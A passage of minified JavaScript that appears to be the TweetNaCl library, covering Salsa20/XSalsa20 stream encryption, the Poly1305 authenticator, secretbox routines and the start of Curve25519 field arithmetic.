                for (var ut = Fe[0] & 255 | (Fe[1] & 255) << 8 | (Fe[2] & 255) << 16 | (Fe[3] & 255) << 24, wt = it[0] & 255 | (it[1] & 255) << 8 | (it[2] & 255) << 16 | (it[3] & 255) << 24, At = it[4] & 255 | (it[5] & 255) << 8 | (it[6] & 255) << 16 | (it[7] & 255) << 24, St = it[8] & 255 | (it[9] & 255) << 8 | (it[10] & 255) << 16 | (it[11] & 255) << 24, Tt = it[12] & 255 | (it[13] & 255) << 8 | (it[14] & 255) << 16 | (it[15] & 255) << 24, er = Fe[4] & 255 | (Fe[5] & 255) << 8 | (Fe[6] & 255) << 16 | (Fe[7] & 255) << 24, Xt = Ye[0] & 255 | (Ye[1] & 255) << 8 | (Ye[2] & 255) << 16 | (Ye[3] & 255) << 24, pr = Ye[4] & 255 | (Ye[5] & 255) << 8 | (Ye[6] & 255) << 16 | (Ye[7] & 255) << 24, or = Ye[8] & 255 | (Ye[9] & 255) << 8 | (Ye[10] & 255) << 16 | (Ye[11] & 255) << 24, yr = Ye[12] & 255 | (Ye[13] & 255) << 8 | (Ye[14] & 255) << 16 | (Ye[15] & 255) << 24, vr = Fe[8] & 255 | (Fe[9] & 255) << 8 | (Fe[10] & 255) << 16 | (Fe[11] & 255) << 24, gr = it[16] & 255 | (it[17] & 255) << 8 | (it[18] & 255) << 16 | (it[19] & 255) << 24, Sr = it[20] & 255 | (it[21] & 255) << 8 | (it[22] & 255) << 16 | (it[23] & 255) << 24, br = it[24] & 255 | (it[25] & 255) << 8 | (it[26] & 255) << 16 | (it[27] & 255) << 24, _r = it[28] & 255 | (it[29] & 255) << 8 | (it[30] & 255) << 16 | (it[31] & 255) << 24, wr = Fe[12] & 255 | (Fe[13] & 255) << 8 | (Fe[14] & 255) << 16 | (Fe[15] & 255) << 24, sr = ut, dr = wt, nr = At, lr = St, fr = Tt, ir = er, $t = Xt, Nt = pr, ar = or, Zt = yr, Gt = vr, ur = gr, Tr = Sr, Or = br, Nr = _r, Br = wr, Rt, Cr = 0; Cr < 20; Cr += 2)
                    Rt = sr + Tr | 0,
                    fr ^= Rt << 7 | Rt >>> 25,
                    Rt = fr + sr | 0,
                    ar ^= Rt << 9 | Rt >>> 23,
                    Rt = ar + fr | 0,
                    Tr ^= Rt << 13 | Rt >>> 19,
                    Rt = Tr + ar | 0,
                    sr ^= Rt << 18 | Rt >>> 14,
                    Rt = ir + dr | 0,
                    Zt ^= Rt << 7 | Rt >>> 25,
                    Rt = Zt + ir | 0,
                    Or ^= Rt << 9 | Rt >>> 23,
                    Rt = Or + Zt | 0,
                    dr ^= Rt << 13 | Rt >>> 19,
                    Rt = dr + Or | 0,
                    ir ^= Rt << 18 | Rt >>> 14,
                    Rt = Gt + $t | 0,
                    Nr ^= Rt << 7 | Rt >>> 25,
                    Rt = Nr + Gt | 0,
                    nr ^= Rt << 9 | Rt >>> 23,
                    Rt = nr + Nr | 0,
                    $t ^= Rt << 13 | Rt >>> 19,
                    Rt = $t + nr | 0,
                    Gt ^= Rt << 18 | Rt >>> 14,
                    Rt = Br + ur | 0,
                    lr ^= Rt << 7 | Rt >>> 25,
                    Rt = lr + Br | 0,
                    Nt ^= Rt << 9 | Rt >>> 23,
                    Rt = Nt + lr | 0,
                    ur ^= Rt << 13 | Rt >>> 19,
                    Rt = ur + Nt | 0,
                    Br ^= Rt << 18 | Rt >>> 14,
                    Rt = sr + lr | 0,
                    dr ^= Rt << 7 | Rt >>> 25,
                    Rt = dr + sr | 0,
                    nr ^= Rt << 9 | Rt >>> 23,
                    Rt = nr + dr | 0,
                    lr ^= Rt << 13 | Rt >>> 19,
                    Rt = lr + nr | 0,
                    sr ^= Rt << 18 | Rt >>> 14,
                    Rt = ir + fr | 0,
                    $t ^= Rt << 7 | Rt >>> 25,
                    Rt = $t + ir | 0,
                    Nt ^= Rt << 9 | Rt >>> 23,
                    Rt = Nt + $t | 0,
                    fr ^= Rt << 13 | Rt >>> 19,
                    Rt = fr + Nt | 0,
                    ir ^= Rt << 18 | Rt >>> 14,
                    Rt = Gt + Zt | 0,
                    ur ^= Rt << 7 | Rt >>> 25,
                    Rt = ur + Gt | 0,
                    ar ^= Rt << 9 | Rt >>> 23,
                    Rt = ar + ur | 0,
                    Zt ^= Rt << 13 | Rt >>> 19,
                    Rt = Zt + ar | 0,
                    Gt ^= Rt << 18 | Rt >>> 14,
                    Rt = Br + Nr | 0,
                    Tr ^= Rt << 7 | Rt >>> 25,
                    Rt = Tr + Br | 0,
                    Or ^= Rt << 9 | Rt >>> 23,
                    Rt = Or + Tr | 0,
                    Nr ^= Rt << 13 | Rt >>> 19,
                    Rt = Nr + Or | 0,
                    Br ^= Rt << 18 | Rt >>> 14;
                Ge[0] = sr >>> 0 & 255,
                Ge[1] = sr >>> 8 & 255,
                Ge[2] = sr >>> 16 & 255,
                Ge[3] = sr >>> 24 & 255,
                Ge[4] = ir >>> 0 & 255,
                Ge[5] = ir >>> 8 & 255,
                Ge[6] = ir >>> 16 & 255,
                Ge[7] = ir >>> 24 & 255,
                Ge[8] = Gt >>> 0 & 255,
                Ge[9] = Gt >>> 8 & 255,
                Ge[10] = Gt >>> 16 & 255,
                Ge[11] = Gt >>> 24 & 255,
                Ge[12] = Br >>> 0 & 255,
                Ge[13] = Br >>> 8 & 255,
                Ge[14] = Br >>> 16 & 255,
                Ge[15] = Br >>> 24 & 255,
                Ge[16] = $t >>> 0 & 255,
                Ge[17] = $t >>> 8 & 255,
                Ge[18] = $t >>> 16 & 255,
                Ge[19] = $t >>> 24 & 255,
                Ge[20] = Nt >>> 0 & 255,
                Ge[21] = Nt >>> 8 & 255,
                Ge[22] = Nt >>> 16 & 255,
                Ge[23] = Nt >>> 24 & 255,
                Ge[24] = ar >>> 0 & 255,
                Ge[25] = ar >>> 8 & 255,
                Ge[26] = ar >>> 16 & 255,
                Ge[27] = ar >>> 24 & 255,
                Ge[28] = Zt >>> 0 & 255,
                Ge[29] = Zt >>> 8 & 255,
                Ge[30] = Zt >>> 16 & 255,
                Ge[31] = Zt >>> 24 & 255
            }
            function pe(Ge, Ye, it, Fe) {
                fe(Ge, Ye, it, Fe)
            }
            function ye(Ge, Ye, it, Fe) {
                he(Ge, Ye, it, Fe)
            }
            var be = new Uint8Array([101, 120, 112, 97, 110, 100, 32, 51, 50, 45, 98, 121, 116, 101, 32, 107]);
            function xe(Ge, Ye, it, Fe, ut, wt, At) {
                var St = new Uint8Array(16), Tt = new Uint8Array(64), er, Xt;
                for (Xt = 0; Xt < 16; Xt++)
                    St[Xt] = 0;
                for (Xt = 0; Xt < 8; Xt++)
                    St[Xt] = wt[Xt];
                for (; ut >= 64; ) {
                    for (pe(Tt, St, At, be),
                    Xt = 0; Xt < 64; Xt++)
                        Ge[Ye + Xt] = it[Fe + Xt] ^ Tt[Xt];
                    for (er = 1,
                    Xt = 8; Xt < 16; Xt++)
                        er = er + (St[Xt] & 255) | 0,
                        St[Xt] = er & 255,
                        er >>>= 8;
                    ut -= 64,
                    Ye += 64,
                    Fe += 64
                }
                if (ut > 0)
                    for (pe(Tt, St, At, be),
                    Xt = 0; Xt < ut; Xt++)
                        Ge[Ye + Xt] = it[Fe + Xt] ^ Tt[Xt];
                return 0
            }
            function Ae(Ge, Ye, it, Fe, ut) {
                var wt = new Uint8Array(16), At = new Uint8Array(64), St, Tt;
                for (Tt = 0; Tt < 16; Tt++)
                    wt[Tt] = 0;
                for (Tt = 0; Tt < 8; Tt++)
                    wt[Tt] = Fe[Tt];
                for (; it >= 64; ) {
                    for (pe(At, wt, ut, be),
                    Tt = 0; Tt < 64; Tt++)
                        Ge[Ye + Tt] = At[Tt];
                    for (St = 1,
                    Tt = 8; Tt < 16; Tt++)
                        St = St + (wt[Tt] & 255) | 0,
                        wt[Tt] = St & 255,
                        St >>>= 8;
                    it -= 64,
                    Ye += 64
                }
                if (it > 0)
                    for (pe(At, wt, ut, be),
                    Tt = 0; Tt < it; Tt++)
                        Ge[Ye + Tt] = At[Tt];
                return 0
            }
            function Ee(Ge, Ye, it, Fe, ut) {
                var wt = new Uint8Array(32);
                ye(wt, Fe, ut, be);
                for (var At = new Uint8Array(8), St = 0; St < 8; St++)
                    At[St] = Fe[St + 16];
                return Ae(Ge, Ye, it, At, wt)
            }
            function Be(Ge, Ye, it, Fe, ut, wt, At) {
                var St = new Uint8Array(32);
                ye(St, wt, At, be);
                for (var Tt = new Uint8Array(8), er = 0; er < 8; er++)
                    Tt[er] = wt[er + 16];
                return xe(Ge, Ye, it, Fe, ut, Tt, St)
            }
            var ce = function(Ge) {
                this.buffer = new Uint8Array(16),
                this.r = new Uint16Array(10),
                this.h = new Uint16Array(10),
                this.pad = new Uint16Array(8),
                this.leftover = 0,
                this.fin = 0;
                var Ye, it, Fe, ut, wt, At, St, Tt;
                Ye = Ge[0] & 255 | (Ge[1] & 255) << 8,
                this.r[0] = Ye & 8191,
                it = Ge[2] & 255 | (Ge[3] & 255) << 8,
                this.r[1] = (Ye >>> 13 | it << 3) & 8191,
                Fe = Ge[4] & 255 | (Ge[5] & 255) << 8,
                this.r[2] = (it >>> 10 | Fe << 6) & 7939,
                ut = Ge[6] & 255 | (Ge[7] & 255) << 8,
                this.r[3] = (Fe >>> 7 | ut << 9) & 8191,
                wt = Ge[8] & 255 | (Ge[9] & 255) << 8,
                this.r[4] = (ut >>> 4 | wt << 12) & 255,
                this.r[5] = wt >>> 1 & 8190,
                At = Ge[10] & 255 | (Ge[11] & 255) << 8,
                this.r[6] = (wt >>> 14 | At << 2) & 8191,
                St = Ge[12] & 255 | (Ge[13] & 255) << 8,
                this.r[7] = (At >>> 11 | St << 5) & 8065,
                Tt = Ge[14] & 255 | (Ge[15] & 255) << 8,
                this.r[8] = (St >>> 8 | Tt << 8) & 8191,
                this.r[9] = Tt >>> 5 & 127,
                this.pad[0] = Ge[16] & 255 | (Ge[17] & 255) << 8,
                this.pad[1] = Ge[18] & 255 | (Ge[19] & 255) << 8,
                this.pad[2] = Ge[20] & 255 | (Ge[21] & 255) << 8,
                this.pad[3] = Ge[22] & 255 | (Ge[23] & 255) << 8,
                this.pad[4] = Ge[24] & 255 | (Ge[25] & 255) << 8,
                this.pad[5] = Ge[26] & 255 | (Ge[27] & 255) << 8,
                this.pad[6] = Ge[28] & 255 | (Ge[29] & 255) << 8,
                this.pad[7] = Ge[30] & 255 | (Ge[31] & 255) << 8
            };
            ce.prototype.blocks = function(Ge, Ye, it) {
                for (var Fe = this.fin ? 0 : 2048, ut, wt, At, St, Tt, er, Xt, pr, or, yr, vr, gr, Sr, br, _r, wr, sr, dr, nr, lr = this.h[0], fr = this.h[1], ir = this.h[2], $t = this.h[3], Nt = this.h[4], ar = this.h[5], Zt = this.h[6], Gt = this.h[7], ur = this.h[8], Tr = this.h[9], Or = this.r[0], Nr = this.r[1], Br = this.r[2], Rt = this.r[3], Cr = this.r[4], Lr = this.r[5], Ur = this.r[6], Dr = this.r[7], Xe = this.r[8], cr = this.r[9]; it >= 16; )
                    ut = Ge[Ye + 0] & 255 | (Ge[Ye + 1] & 255) << 8,
                    lr += ut & 8191,
                    wt = Ge[Ye + 2] & 255 | (Ge[Ye + 3] & 255) << 8,
                    fr += (ut >>> 13 | wt << 3) & 8191,
                    At = Ge[Ye + 4] & 255 | (Ge[Ye + 5] & 255) << 8,
                    ir += (wt >>> 10 | At << 6) & 8191,
                    St = Ge[Ye + 6] & 255 | (Ge[Ye + 7] & 255) << 8,
                    $t += (At >>> 7 | St << 9) & 8191,
                    Tt = Ge[Ye + 8] & 255 | (Ge[Ye + 9] & 255) << 8,
                    Nt += (St >>> 4 | Tt << 12) & 8191,
                    ar += Tt >>> 1 & 8191,
                    er = Ge[Ye + 10] & 255 | (Ge[Ye + 11] & 255) << 8,
                    Zt += (Tt >>> 14 | er << 2) & 8191,
                    Xt = Ge[Ye + 12] & 255 | (Ge[Ye + 13] & 255) << 8,
                    Gt += (er >>> 11 | Xt << 5) & 8191,
                    pr = Ge[Ye + 14] & 255 | (Ge[Ye + 15] & 255) << 8,
                    ur += (Xt >>> 8 | pr << 8) & 8191,
                    Tr += pr >>> 5 | Fe,
                    or = 0,
                    yr = or,
                    yr += lr * Or,
                    yr += fr * (5 * cr),
                    yr += ir * (5 * Xe),
                    yr += $t * (5 * Dr),
                    yr += Nt * (5 * Ur),
                    or = yr >>> 13,
                    yr &= 8191,
                    yr += ar * (5 * Lr),
                    yr += Zt * (5 * Cr),
                    yr += Gt * (5 * Rt),
                    yr += ur * (5 * Br),
                    yr += Tr * (5 * Nr),
                    or += yr >>> 13,
                    yr &= 8191,
                    vr = or,
                    vr += lr * Nr,
                    vr += fr * Or,
                    vr += ir * (5 * cr),
                    vr += $t * (5 * Xe),
                    vr += Nt * (5 * Dr),
                    or = vr >>> 13,
                    vr &= 8191,
                    vr += ar * (5 * Ur),
                    vr += Zt * (5 * Lr),
                    vr += Gt * (5 * Cr),
                    vr += ur * (5 * Rt),
                    vr += Tr * (5 * Br),
                    or += vr >>> 13,
                    vr &= 8191,
                    gr = or,
                    gr += lr * Br,
                    gr += fr * Nr,
                    gr += ir * Or,
                    gr += $t * (5 * cr),
                    gr += Nt * (5 * Xe),
                    or = gr >>> 13,
                    gr &= 8191,
                    gr += ar * (5 * Dr),
                    gr += Zt * (5 * Ur),
                    gr += Gt * (5 * Lr),
                    gr += ur * (5 * Cr),
                    gr += Tr * (5 * Rt),
                    or += gr >>> 13,
                    gr &= 8191,
                    Sr = or,
                    Sr += lr * Rt,
                    Sr += fr * Br,
                    Sr += ir * Nr,
                    Sr += $t * Or,
                    Sr += Nt * (5 * cr),
                    or = Sr >>> 13,
                    Sr &= 8191,
                    Sr += ar * (5 * Xe),
                    Sr += Zt * (5 * Dr),
                    Sr += Gt * (5 * Ur),
                    Sr += ur * (5 * Lr),
                    Sr += Tr * (5 * Cr),
                    or += Sr >>> 13,
                    Sr &= 8191,
                    br = or,
                    br += lr * Cr,
                    br += fr * Rt,
                    br += ir * Br,
                    br += $t * Nr,
                    br += Nt * Or,
                    or = br >>> 13,
                    br &= 8191,
                    br += ar * (5 * cr),
                    br += Zt * (5 * Xe),
                    br += Gt * (5 * Dr),
                    br += ur * (5 * Ur),
                    br += Tr * (5 * Lr),
                    or += br >>> 13,
                    br &= 8191,
                    _r = or,
                    _r += lr * Lr,
                    _r += fr * Cr,
                    _r += ir * Rt,
                    _r += $t * Br,
                    _r += Nt * Nr,
                    or = _r >>> 13,
                    _r &= 8191,
                    _r += ar * Or,
                    _r += Zt * (5 * cr),
                    _r += Gt * (5 * Xe),
                    _r += ur * (5 * Dr),
                    _r += Tr * (5 * Ur),
                    or += _r >>> 13,
                    _r &= 8191,
                    wr = or,
                    wr += lr * Ur,
                    wr += fr * Lr,
                    wr += ir * Cr,
                    wr += $t * Rt,
                    wr += Nt * Br,
                    or = wr >>> 13,
                    wr &= 8191,
                    wr += ar * Nr,
                    wr += Zt * Or,
                    wr += Gt * (5 * cr),
                    wr += ur * (5 * Xe),
                    wr += Tr * (5 * Dr),
                    or += wr >>> 13,
                    wr &= 8191,
                    sr = or,
                    sr += lr * Dr,
                    sr += fr * Ur,
                    sr += ir * Lr,
                    sr += $t * Cr,
                    sr += Nt * Rt,
                    or = sr >>> 13,
                    sr &= 8191,
                    sr += ar * Br,
                    sr += Zt * Nr,
                    sr += Gt * Or,
                    sr += ur * (5 * cr),
                    sr += Tr * (5 * Xe),
                    or += sr >>> 13,
                    sr &= 8191,
                    dr = or,
                    dr += lr * Xe,
                    dr += fr * Dr,
                    dr += ir * Ur,
                    dr += $t * Lr,
                    dr += Nt * Cr,
                    or = dr >>> 13,
                    dr &= 8191,
                    dr += ar * Rt,
                    dr += Zt * Br,
                    dr += Gt * Nr,
                    dr += ur * Or,
                    dr += Tr * (5 * cr),
                    or += dr >>> 13,
                    dr &= 8191,
                    nr = or,
                    nr += lr * cr,
                    nr += fr * Xe,
                    nr += ir * Dr,
                    nr += $t * Ur,
                    nr += Nt * Lr,
                    or = nr >>> 13,
                    nr &= 8191,
                    nr += ar * Cr,
                    nr += Zt * Rt,
                    nr += Gt * Br,
                    nr += ur * Nr,
                    nr += Tr * Or,
                    or += nr >>> 13,
                    nr &= 8191,
                    or = (or << 2) + or | 0,
                    or = or + yr | 0,
                    yr = or & 8191,
                    or = or >>> 13,
                    vr += or,
                    lr = yr,
                    fr = vr,
                    ir = gr,
                    $t = Sr,
                    Nt = br,
                    ar = _r,
                    Zt = wr,
                    Gt = sr,
                    ur = dr,
                    Tr = nr,
                    Ye += 16,
                    it -= 16;
                this.h[0] = lr,
                this.h[1] = fr,
                this.h[2] = ir,
                this.h[3] = $t,
                this.h[4] = Nt,
                this.h[5] = ar,
                this.h[6] = Zt,
                this.h[7] = Gt,
                this.h[8] = ur,
                this.h[9] = Tr
            }
            ,
            ce.prototype.finish = function(Ge, Ye) {
                var it = new Uint16Array(10), Fe, ut, wt, At;
                if (this.leftover) {
                    for (At = this.leftover,
                    this.buffer[At++] = 1; At < 16; At++)
                        this.buffer[At] = 0;
                    this.fin = 1,
                    this.blocks(this.buffer, 0, 16)
                }
                for (Fe = this.h[1] >>> 13,
                this.h[1] &= 8191,
                At = 2; At < 10; At++)
                    this.h[At] += Fe,
                    Fe = this.h[At] >>> 13,
                    this.h[At] &= 8191;
                for (this.h[0] += Fe * 5,
                Fe = this.h[0] >>> 13,
                this.h[0] &= 8191,
                this.h[1] += Fe,
                Fe = this.h[1] >>> 13,
                this.h[1] &= 8191,
                this.h[2] += Fe,
                it[0] = this.h[0] + 5,
                Fe = it[0] >>> 13,
                it[0] &= 8191,
                At = 1; At < 10; At++)
                    it[At] = this.h[At] + Fe,
                    Fe = it[At] >>> 13,
                    it[At] &= 8191;
                for (it[9] -= 8192,
                ut = (Fe ^ 1) - 1,
                At = 0; At < 10; At++)
                    it[At] &= ut;
                for (ut = ~ut,
                At = 0; At < 10; At++)
                    this.h[At] = this.h[At] & ut | it[At];
                for (this.h[0] = (this.h[0] | this.h[1] << 13) & 65535,
                this.h[1] = (this.h[1] >>> 3 | this.h[2] << 10) & 65535,
                this.h[2] = (this.h[2] >>> 6 | this.h[3] << 7) & 65535,
                this.h[3] = (this.h[3] >>> 9 | this.h[4] << 4) & 65535,
                this.h[4] = (this.h[4] >>> 12 | this.h[5] << 1 | this.h[6] << 14) & 65535,
                this.h[5] = (this.h[6] >>> 2 | this.h[7] << 11) & 65535,
                this.h[6] = (this.h[7] >>> 5 | this.h[8] << 8) & 65535,
                this.h[7] = (this.h[8] >>> 8 | this.h[9] << 5) & 65535,
                wt = this.h[0] + this.pad[0],
                this.h[0] = wt & 65535,
                At = 1; At < 8; At++)
                    wt = (this.h[At] + this.pad[At] | 0) + (wt >>> 16) | 0,
                    this.h[At] = wt & 65535;
                Ge[Ye + 0] = this.h[0] >>> 0 & 255,
                Ge[Ye + 1] = this.h[0] >>> 8 & 255,
                Ge[Ye + 2] = this.h[1] >>> 0 & 255,
                Ge[Ye + 3] = this.h[1] >>> 8 & 255,
                Ge[Ye + 4] = this.h[2] >>> 0 & 255,
                Ge[Ye + 5] = this.h[2] >>> 8 & 255,
                Ge[Ye + 6] = this.h[3] >>> 0 & 255,
                Ge[Ye + 7] = this.h[3] >>> 8 & 255,
                Ge[Ye + 8] = this.h[4] >>> 0 & 255,
                Ge[Ye + 9] = this.h[4] >>> 8 & 255,
                Ge[Ye + 10] = this.h[5] >>> 0 & 255,
                Ge[Ye + 11] = this.h[5] >>> 8 & 255,
                Ge[Ye + 12] = this.h[6] >>> 0 & 255,
                Ge[Ye + 13] = this.h[6] >>> 8 & 255,
                Ge[Ye + 14] = this.h[7] >>> 0 & 255,
                Ge[Ye + 15] = this.h[7] >>> 8 & 255
            }
            ,
            ce.prototype.update = function(Ge, Ye, it) {
                var Fe, ut;
                if (this.leftover) {
                    for (ut = 16 - this.leftover,
                    ut > it && (ut = it),
                    Fe = 0; Fe < ut; Fe++)
                        this.buffer[this.leftover + Fe] = Ge[Ye + Fe];
                    if (it -= ut,
                    Ye += ut,
                    this.leftover += ut,
                    this.leftover < 16)
                        return;
                    this.blocks(this.buffer, 0, 16),
                    this.leftover = 0
                }
                if (it >= 16 && (ut = it - it % 16,
                this.blocks(Ge, Ye, ut),
                Ye += ut,
                it -= ut),
                it) {
                    for (Fe = 0; Fe < it; Fe++)
                        this.buffer[this.leftover + Fe] = Ge[Ye + Fe];
                    this.leftover += it
                }
            }
            ;
            function q(Ge, Ye, it, Fe, ut, wt) {
                var At = new ce(wt);
                return At.update(it, Fe, ut),
                At.finish(Ge, Ye),
                0
            }
            function L(Ge, Ye, it, Fe, ut, wt) {
                var At = new Uint8Array(16);
                return q(At, 0, it, Fe, ut, wt),
                oe(Ge, Ye, At, 0)
            }
            function U(Ge, Ye, it, Fe, ut) {
                var wt;
                if (it < 32)
                    return -1;
                for (Be(Ge, 0, Ye, 0, it, Fe, ut),
                q(Ge, 16, Ge, 32, it - 32, Ge),
                wt = 0; wt < 16; wt++)
                    Ge[wt] = 0;
                return 0
            }
            function Z(Ge, Ye, it, Fe, ut) {
                var wt, At = new Uint8Array(32);
                if (it < 32 || (Ee(At, 0, 32, Fe, ut),
                L(Ye, 16, Ye, 32, it - 32, At) !== 0))
                    return -1;
                for (Be(Ge, 0, Ye, 0, it, Fe, ut),
                wt = 0; wt < 32; wt++)
                    Ge[wt] = 0;
                return 0
            }
            function te(Ge, Ye) {
                var it;
                for (it = 0; it < 16; it++)
                    Ge[it] = Ye[it] | 0
            }
            function se(Ge) {
                var Ye, it, Fe = 1;
                for (Ye = 0; Ye < 16; Ye++)
                    it = Ge[Ye] + Fe + 65535,
                    Fe = Math.floor(it / 65536),
                    Ge[Ye] = it - Fe * 65536;
                Ge[0] += Fe - 1 + 37 * (Fe - 1)
            }
            function de(Ge, Ye, it) {
                for (var Fe, ut = ~(it - 1), wt = 0; wt < 16; wt++)
                    Fe = ut & (Ge[wt] ^ Ye[wt]),
                    Ge[wt] ^= Fe,
                    Ye[wt] ^= Fe
            }
            function re(Ge, Ye) {
                var it, Fe, ut, wt = j(), At = j();
                for (it = 0; it < 16; it++)
                    At[it] = Ye[it];
                for (se(At),
                se(At),
                se(At),
                Fe = 0; Fe < 2; Fe++) {
                    for (wt[0] = At[0] - 65517,
                    it = 1; it < 15; it++)
                        wt[it] = At[it] - 65535 - (wt[it - 1] >> 16 & 1),
                        wt[it - 1] &= 65535;
                    wt[15] = At[15] - 32767 - (wt[14] >> 16 & 1),
                    ut = wt[15] >> 16 & 1,
                    wt[14] &= 65535,
                    de(At, wt, 1 - ut)
                }
                for (it = 0; it < 16; it++)
                    Ge[2 * it] = At[it] & 255,
                    Ge[2 * it + 1] = At[it] >> 8
            }
            function $(Ge, Ye) {
                var it = new Uint8Array(32)
                  , Fe = new Uint8Array(32);
                return re(it, Ge),
                re(Fe, Ye),
                ue(it, 0, Fe, 0)
            }
            function ie(Ge) {
                var Ye = new Uint8Array(32);
                return re(Ye, Ge),
                Ye[0] & 1
            }
            function ve(Ge, Ye) {
                var it;
                for (it = 0; it < 16; it++)
                    Ge[it] = Ye[2 * it] + (Ye[2 * it + 1] << 8);
                Ge[15] &= 32767
            }
            function ge(Ge, Ye, it) {
                for (var Fe = 0; Fe < 16; Fe++)
                    Ge[Fe] = Ye[Fe] + it[Fe]
            }
            function Re(Ge, Ye, it) {
                for (var Fe = 0; Fe < 16; Fe++)
                    Ge[Fe] = Ye[Fe] - it[Fe]
            }
            function Pe(Ge, Ye, it) {
                var Fe, ut, wt = 0, At = 0, St = 0, Tt = 0, er = 0, Xt = 0, pr = 0, or = 0, yr = 0, vr = 0, gr = 0, Sr = 0, br = 0, _r = 0, wr = 0, sr = 0, dr = 0, nr = 0, lr = 0, fr = 0, ir = 0, $t = 0, Nt = 0, ar = 0, Zt = 0, Gt = 0, ur = 0, Tr = 0, Or = 0, Nr = 0, Br = 0, Rt = it[0], Cr = it[1], Lr = it[2], Ur = it[3], Dr = it[4], Xe = it[5], cr = it[6], en = it[7], jr = it[8], tn = it[9], rn = it[10], Kt = it[11], Qt = it[12], pn = it[13], Xr = it[14], Fr = it[15];
                Fe = Ye[0],
                wt += Fe * Rt,
                At += Fe * Cr,
                St += Fe * Lr,
                Tt += Fe * Ur,
                er += Fe * Dr,
                Xt += Fe * Xe,
                pr += Fe * cr,
                or += Fe * en,
                yr += Fe * jr,
                vr += Fe * tn,
                gr += Fe * rn,
                Sr += Fe * Kt,
                br += Fe * Qt,
                _r += Fe * pn,
                wr += Fe * Xr,
                sr += Fe * Fr,
                Fe = Ye[1],
                At += Fe * Rt,
                St += Fe * Cr,
                Tt += Fe * Lr,
                er += Fe * Ur,
                Xt += Fe * Dr,
                pr += Fe * Xe,
                or += Fe * cr,
                yr += Fe * en,
                vr += Fe * jr,
                gr += Fe * tn,
                Sr += Fe * rn,
                br += Fe * Kt,
                _r += Fe * Qt,
                wr += Fe * pn,
                sr += Fe * Xr,
                dr += Fe * Fr,
                Fe = Ye[2],
                St += Fe * Rt,
                Tt += Fe * Cr,
                er += Fe * Lr,
                Xt += Fe * Ur,
                pr += Fe * Dr,
                or += Fe * Xe,
                yr += Fe * cr,
                vr += Fe * en,
                gr += Fe * jr,
                Sr += Fe * tn,
                br += Fe * rn,
                _r += Fe * Kt,
                wr += Fe * Qt,
                sr += Fe * pn,
                dr += Fe * Xr,
                nr += Fe * Fr,
                Fe = Ye[3],
                Tt += Fe * Rt,
                er += Fe * Cr,
                Xt += Fe * Lr,
                pr += Fe * Ur,
                or += Fe * Dr,
                yr += Fe * Xe,
                vr += Fe * cr,
                gr += Fe * en,
                Sr += Fe * jr,
                br += Fe * tn,
                _r += Fe * rn,
                wr += Fe * Kt,
                sr += Fe * Qt,
                dr += Fe * pn,
                nr += Fe * Xr,
                lr += Fe * Fr,
                Fe = Ye[4],
                er += Fe * Rt,
                Xt += Fe * Cr,
                pr += Fe * Lr,
                or += Fe * Ur,
                yr += Fe * Dr,
                vr += Fe * Xe,
                gr += Fe * cr,
                Sr += Fe * en,
                br += Fe * jr,
                _r += Fe * tn,
                wr += Fe * rn,
                sr += Fe * Kt,
                dr += Fe * Qt,
                nr += Fe * pn,
                lr += Fe * Xr,
                fr += Fe * Fr,
                Fe = Ye[5],
                Xt += Fe * Rt,
                pr += Fe * Cr,
                or += Fe * Lr,
                yr += Fe * Ur,
                vr += Fe * Dr,
                gr += Fe * Xe,
                Sr += Fe * cr,
                br += Fe * en,
                _r += Fe * jr,
                wr += Fe * tn,
                sr += Fe * rn,
                dr += Fe * Kt,
                nr += Fe * Qt,
                lr += Fe * pn,
                fr += Fe * Xr,
                ir += Fe * Fr,
                Fe = Ye[6],
                pr += Fe * Rt,
                or += Fe * Cr,
                yr += Fe * Lr,
                vr += Fe * Ur,
                gr += Fe * Dr,
                Sr += Fe * Xe,
                br += Fe * cr,
                _r += Fe * en,
                wr += Fe * jr,
                sr += Fe * tn,
                dr += Fe * rn,
                nr += Fe * Kt,
                lr += Fe * Qt,
                fr += Fe * pn,
                ir += Fe * Xr,
                $t += Fe * Fr,
                Fe = Ye[7],
                or += Fe * Rt,
                yr += Fe * Cr,
                vr += Fe * Lr,
                gr += Fe * Ur,
                Sr += Fe * Dr,
                br += Fe * Xe,
                _r += Fe * cr,
                wr += Fe * en,
                sr += Fe * jr,
                dr += Fe * tn,
                nr += Fe * rn,
                lr += Fe * Kt,
                fr += Fe * Qt,
                ir += Fe * pn,
                $t += Fe * Xr,
                Nt += Fe * Fr,
                Fe = Ye[8],
                yr += Fe * Rt,
                vr += Fe * Cr,
                gr += Fe * Lr,
                Sr += Fe * Ur,
                br += Fe * Dr,
                _r += Fe * Xe,
                wr += Fe * cr,
                sr += Fe * en,
                dr += Fe * jr,
                nr += Fe * tn,
                lr += Fe * rn,
                fr += Fe * Kt,
                ir += Fe * Qt,
                $t += Fe * pn,
                Nt += Fe * Xr,
                ar += Fe * Fr,
                Fe = Ye[9],
                vr += Fe * Rt,
                gr += Fe * Cr,
                Sr += Fe * Lr,
                br += Fe * Ur,
                _r += Fe * Dr,
                wr += Fe * Xe,
                sr += Fe * cr,
                dr += Fe * en,
                nr += Fe * jr,
                lr += Fe * tn,
                fr += Fe * rn,
                ir += Fe * Kt,
                $t += Fe * Qt,
                Nt += Fe * pn,
                ar += Fe * Xr,
                Zt += Fe * Fr,
                Fe = Ye[10],
                gr += Fe * Rt,
                Sr += Fe * Cr,
                br += Fe * Lr,
                _r += Fe * Ur,
                wr += Fe * Dr,
                sr += Fe * Xe,
                dr += Fe * cr,
                nr += Fe * en,
                lr += Fe * jr,
                fr += Fe * tn,
                ir += Fe * rn,
                $t += Fe * Kt,
                Nt += Fe * Qt,
                ar += Fe * pn,
                Zt += Fe * Xr,
                Gt += Fe * Fr,
                Fe = Ye[11],
                Sr += Fe * Rt,
                br += Fe * Cr,
                _r += Fe * Lr,
                wr += Fe * Ur,
                sr += Fe * Dr,
                dr += Fe * Xe,
                nr += Fe * cr,
                lr += Fe * en,
                fr += Fe * jr,
                ir += Fe * tn,
                $t += Fe * rn,
                Nt += Fe * Kt,
                ar += Fe * Qt,
                Zt += Fe * pn,
                Gt += Fe * Xr,
                ur += Fe * Fr,
                Fe = Ye[12],
                br += Fe * Rt,
                _r += Fe * Cr,
                wr += Fe * Lr,
                sr += Fe * Ur,
                dr += Fe * Dr,
                nr += Fe * Xe,
                lr += Fe * cr,
                fr += Fe * en,
                ir += Fe * jr,
                $t += Fe * tn,
                Nt += Fe * rn,
                ar += Fe * Kt,
                Zt += Fe * Qt,
                Gt += Fe * pn,
                ur += Fe * Xr,
                Tr += Fe * Fr,
                Fe = Ye[13],
                _r += Fe * Rt,
